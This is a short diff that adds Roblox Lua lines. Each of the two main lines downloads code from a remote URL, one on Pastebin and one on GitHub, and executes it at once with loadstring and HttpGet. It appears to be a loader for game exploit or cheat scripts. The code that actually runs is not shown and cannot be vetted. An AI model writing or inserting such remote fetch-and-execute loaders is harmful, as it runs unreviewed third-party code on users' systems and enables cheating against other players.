@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/humR2WPQ"))()
+task.wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JakeScripterz/Aura-TSB/refs/heads/main/Kratos"))()
